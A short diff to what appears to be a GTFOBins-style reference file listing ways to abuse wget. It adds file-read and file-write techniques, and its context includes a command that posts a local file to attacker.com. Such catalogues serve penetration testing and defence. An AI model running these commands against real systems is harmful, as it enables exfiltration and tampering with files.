@@ -6,6 +6,18 @@ functions:
         URL=http://attacker.com/
         LFILE=file_to_send
         wget --post-file=$LFILE $URL
+  file-read:
+    - description: output the file as an error.
+      code: |
+        LFILE=file-to-read
+        wget -i $LFILE
+  file-write:
+    - description: write data to a file.
+      code: |
+        LFILE=file-to-write
+        TF=$(mktemp)
+        echo DATA > $TF
+        wget -i $TF -o $LFILE
   file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
